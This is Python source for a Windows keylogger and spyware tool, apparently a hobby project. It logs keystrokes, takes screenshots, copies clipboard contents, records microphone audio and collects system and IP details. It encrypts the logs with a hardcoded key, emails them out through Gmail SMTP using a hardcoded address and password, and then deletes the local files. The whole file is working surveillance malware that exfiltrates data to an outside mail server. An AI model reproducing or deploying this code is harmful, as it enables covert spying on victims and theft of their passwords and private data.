from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

import socket
import platform

import win32clipboard

from pynput.keyboard import Key, Listener

import time
import os

from scipy.io.wavfile import write
import sounddevice as sd

from cryptography.fernet import Fernet

import getpass
from requests import get

from multiprocessing import Process, freeze_support
from PIL import ImageGrab

keys_information = "key_log.txt"
file_path = "D:\Cyber\projects\keylogger\Project"
extend = "\\"
file_merge = file_path + extend

system_information = "systeminfo.txt"
clipboard_information = "clipboard.txt"
audio_information = "audio.wav"
screenshot_information = "screenshot.png"

e_keys_information = "e_key_log.txt"
e_system_information = "e_systeminfo.txt"
e_clipboard_information = "e_clipboard.txt"

encryption_key = "d82sX4d-y9G0bS7utB1-S3efbvQZO0JqWe6WT5KRnzs="

email_address = "eladye666@deshr.edumschool.org"
password = "elad1234"
to_addr = email_address
username = getpass.getuser()

count = 0
keys = []

microphone_time = 10
time_iteration = 15
number_of_iterations = 0
number_of_iterations_end = 3
current_time = time.time()
stopping_time = time.time() + time_iteration


def send_email(file_name, attachment, to_addr):
    msg = MIMEMultipart()
    msg['From'] = email_address
    msg['To'] = to_addr
    msg['Subject'] = "Log file"
    body = "Body_of_the_email"
    msg.attach(MIMEText(body, 'plain'))

    attachment = open(attachment, 'rb')
    p = MIMEBase('application', 'octet-stream')
    p.set_payload((attachment).read())
    encoders.encode_base64(p)
    p.add_header('Content-Disposition', "attachment; filename= %s" % file_name)
    msg.attach(p)

    s = smtplib.SMTP('smtp.gmail.com', 587)
    s.starttls()
    s.login(email_address, password)
    text = msg.as_string()

    s.sendmail(email_address, to_addr, text)
    s.quit()


def screenshot():
    img = ImageGrab.grab()
    img.save(file_path + extend + screenshot_information)


def computer_information():
    with open(file_path + extend + system_information, "w") as f:
        hostname = socket.gethostname()
        ip_addr = socket.gethostbyname(hostname)
        try:
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP Address: " + public_ip + "\n")

        except:
            f.write("Couldn't get public ip address")

        f.write(f"Processor: {platform.processor()}\n")
        f.write(f"System: {platform.system()}  {platform.version()}\n")
        f.write(f"Machine: {platform.machine()}\n")
        f.write(f"Hostname: {hostname}\n")
        f.write(f"Private IP Address: {ip_addr}\n")


def copy_clipboard():
    with open(file_path + extend + clipboard_information, "w") as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()

            f.write(f"Clipboard Data: \n{pasted_data}")

        except:
            f.write("Clipboard could not be copied")


def microphone():
    fs = 44100
    seconds = microphone_time

    rec = sd.rec(seconds * fs, samplerate=fs, channels=2)
    sd.wait()
    write(file_path + extend + audio_information, fs, rec)


while number_of_iterations < number_of_iterations_end:

    def on_press(key):
        global keys, count, current_time

        print(key)
        keys.append(key)
        count += 1
        current_time = time.time()

        if count >= 1:
            count = 0
            write_file(keys)
            keys = []


    def write_file(keys):
        with open(file_path + extend + keys_information, "a") as f:
            for key in keys:
                k = str(key).replace("'", "")
                if k.find("space") > 0:
                    f.write("\n")
                    f.close()
                elif k.find("Key") == -1:
                    f.write(k)
                    f.close()


    def on_release(key):
        if key == Key.esc:
            # send_email(keys_information, file_path + extend + keys_information, to_addr)
            # screenshot()
            # computer_information()
            # microphone()
            # copy_clipboard()
            return False
        if current_time > stopping_time:
            return False


    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

    if current_time > stopping_time:
        with open(file_path + extend + keys_information, "w") as f:
            f.write(" ")

        screenshot()
        send_email(screenshot_information, file_path + extend + screenshot_information, to_addr)

        copy_clipboard()
        number_of_iterations += 1
        current_time = time.time()
        stopping_time = time.time() + time_iteration

files_to_encrypt = [file_merge + system_information, file_merge + clipboard_information, file_merge + keys_information]
encrypted_file_names = [file_merge + e_system_information, file_merge + e_clipboard_information,
                        file_merge + e_keys_information]

for index, encrypt_file in enumerate(files_to_encrypt):
    with open(encrypted_file_names[index], 'rb') as f:
        data = f.read()

    fernet = Fernet(encryption_key)
    encrypted_data = fernet.encrypt(data)

    with open(encrypted_file_names[index], 'wb') as f:
        f.write(encrypted_data)

    send_email(encrypted_file_names[index], encrypted_file_names[index], to_addr)

time.sleep(120)

delete_files = [system_information, clipboard_information, keys_information, screenshot_information, audio_information]
for file in delete_files:
    os.remove(file_merge + file)